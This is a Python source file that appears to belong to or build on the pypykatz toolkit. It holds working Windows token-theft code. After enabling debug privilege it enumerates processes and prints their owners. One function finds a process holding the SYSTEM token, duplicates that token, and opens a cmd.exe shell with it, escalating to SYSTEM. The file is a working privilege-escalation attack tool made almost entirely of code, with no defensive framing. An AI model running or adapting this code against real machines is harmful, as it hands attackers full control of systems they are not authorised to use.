
import ctypes
from pypykatz.commons.readers.local.common.advapi32 import *
from pypykatz.commons.readers.local.common.psapi import EnumProcesses
from pypykatz.commons.readers.local.common.kernel32 import OpenProcess, CloseHandle, STARTUPINFOW
from pypykatz.commons.readers.local.common.privileges import RtlAdjustPrivilege
from pypykatz.commons.readers.local.common.privileges_types import PrivilegeValues

tokenprivs = (TOKEN_QUERY | TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_QUERY_SOURCE | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | (131072 | 4))

SYNCHRONIZE                     = 0x00100000

# https://msdn.microsoft.com/en-us/library/windows/desktop/ms684880(v=vs.85).aspx

PROCESS_CREATE_PROCESS           = 0x0080 # Required to create a process.
PROCESS_CREATE_THREAD            = 0x0002 # Required to create a thread.
PROCESS_DUP_HANDLE               = 0x0040 # Required to duplicate a handle using DuplicateHandle.
PROCESS_QUERY_INFORMATION        = 0x0400 # Required to retrieve certain information about a process, such as its token, exit code, and priority class = see OpenProcessToken #.
PROCESS_QUERY_LIMITED_INFORMATION= 0x1000 # Required to retrieve certain information about a process = see GetExitCodeProcess, GetPriorityClass, IsProcessInJob, QueryFullProcessImageName #. A handle that has the PROCESS_QUERY_INFORMATION access right is automatically granted PROCESS_QUERY_LIMITED_INFORMATION.  Windows Server 2003 and Windows XP:  This access right is not supported.
PROCESS_SET_INFORMATION          = 0x0200 # Required to set certain information about a process, such as its priority class = see SetPriorityClass #.
PROCESS_SET_QUOTA                = 0x0100 # Required to set memory limits using SetProcessWorkingSetSize.
PROCESS_SUSPEND_RESUME           = 0x0800 # Required to suspend or resume a process.
PROCESS_TERMINATE                = 0x0001 # Required to terminate a process using TerminateProcess.
PROCESS_VM_OPERATION             = 0x0008 # Required to perform an operation on the address space of a process = see VirtualProtectEx and WriteProcessMemory #.
PROCESS_VM_READ                  = 0x0010 # Required to read memory in a process using ReadProcessMemory.
PROCESS_VM_WRITE                 = 0x0020 # Required to write to memory in a process using WriteProcessMemory.
PROCESS_ALL_ACCESS               = (PROCESS_CREATE_PROCESS
                                  | PROCESS_CREATE_THREAD
                                  | PROCESS_DUP_HANDLE
                                  | PROCESS_QUERY_INFORMATION
                                  | PROCESS_QUERY_LIMITED_INFORMATION
                                  | PROCESS_SET_INFORMATION
                                  | PROCESS_SET_QUOTA
                                  | PROCESS_SUSPEND_RESUME
                                  | PROCESS_TERMINATE
                                  | PROCESS_VM_OPERATION
                                  | PROCESS_VM_READ
                                  | PROCESS_VM_WRITE
                                  | SYNCHRONIZE)
								  
CREATE_NEW_CONSOLE        = 0x00000010

def list_users():
	#LookupAccountSidA
	try:
		RtlAdjustPrivilege(PrivilegeValues.SE_DEBUG.value)
	except Exception as e:
		logger.error('Failed to obtain SE_DEBUG privilege!')
		raise e
		
	for pid in EnumProcesses():
		print(pid)
		proc_handle = None
		try:
			proc_handle = OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
			print('Proc handle for PID %s is: %s' % (proc_handle, pid))
		except Exception as e:
			print('Failed to open process pid %s Reason: %s' % (pid, str(e)))
			continue
		
		else:
			token_handle = None
			try:
				token_handle = OpenProcessToken(proc_handle, DesiredAccess = tokenprivs)
			except Exception as e:
				print('Failed get token from process pid %s Reason: %s' % (pid, str(e)))
				continue
			else:
				
				ptr_sid = GetTokenInformation_sid(token_handle)
				#print('Token for PID %s has SID of %s' % (pid, sid))
				name, domain, use = LookupAccountSidW(None, ptr_sid)
				print('%s:%s:%s' % (name, domain, use))
					
			finally:
				if token_handle is not None:
					CloseHandle(token_handle)
		
		finally:
			if proc_handle is not None:
				CloseHandle(proc_handle)

def getsystem_token():
	try:
		RtlAdjustPrivilege(PrivilegeValues.SE_DEBUG.value)
	except Exception as e:
		logger.error('Failed to obtain SE_DEBUG privilege!')
		raise e
			
	
	for pid in EnumProcesses():
		print(pid)
		proc_handle = None
		try:
			proc_handle = OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
			print('Proc handle for PID %s is: %s' % (proc_handle, pid))
		except Exception as e:
			print('Failed to open process pid %s Reason: %s' % (pid, str(e)))
			continue
		
		else:
			token_handle = None
			try:
				token_handle = OpenProcessToken(proc_handle, DesiredAccess = tokenprivs)
			except Exception as e:
				print('Failed get token from process pid %s Reason: %s' % (pid, str(e)))
				continue
			else:
				
				ptr_sid = GetTokenInformation_sid(token_handle)
				sid = ConvertSidToStringSidA(ptr_sid)
				print('Token for PID %s has SID of %s' % (pid, sid))
				
				if sid == 'S-1-5-18':
					print('Found SYSTEM token in PID %s ' % pid)
					print('Duplicating token....')
					#for creating a new process, the input params need to be a bit modified!
					#cloned_system_token = DuplicateTokenEx(token_handle, 
					#										dwDesiredAccess = TOKEN_QUERY | TOKEN_IMPERSONATE, 
					#										lpTokenAttributes = None, 
					#										ImpersonationLevel = SecurityDelegation, 
					#										TokenType = TokenImpersonation)
					
					cloned_system_token = DuplicateTokenEx(
						token_handle, 
						dwDesiredAccess = TOKEN_ALL_ACCESS, 
						lpTokenAttributes = None, 
						ImpersonationLevel = SecurityImpersonation, 
						TokenType = SecurityImpersonation
					)
					print('Setting token to current thread...')
					try:
						SW_SHOW = 5
						STARTF_USESHOWWINDOW = 0x00000001
						
						#SetThreadToken(cloned_system_token)
						lpStartupInfo			  = STARTUPINFOW()
						lpStartupInfo.cb		   = ctypes.sizeof(STARTUPINFOW)
						lpStartupInfo.lpReserved   = 0
						lpStartupInfo.lpDesktop	= 0
						lpStartupInfo.lpTitle	  = 0
						lpStartupInfo.dwFlags	  = STARTF_USESHOWWINDOW
						lpStartupInfo.cbReserved2  = 0
						lpStartupInfo.lpReserved2  = 0
						lpStartupInfo.wShowWindow  = SW_SHOW
						
						
						
						CreateProcessWithTokenW(
							hToken = cloned_system_token, 
							dwLogonFlags = LOGON_NETCREDENTIALS_ONLY, 
							lpApplicationName = None, 
							lpCommandLine = 'C:\\Windows\\system32\\cmd.exe', 
							dwCreationFlags = CREATE_NEW_CONSOLE, 
							lpEnvironment = None, 
							lpCurrentDirectory = None, 
							lpStartupInfo = lpStartupInfo
						)
					except Exception as e:
						print('Failed changing the thread token. Reason: %s' % e)
						continue
					else:
						print('Success! Now we should be SYSTEM!')
						return
					
			finally:
				if token_handle is not None:
					CloseHandle(token_handle)
		
		finally:
			if proc_handle is not None:
				CloseHandle(proc_handle)
	
if __name__ == '__main__':
	#getsystem_token()
	list_users()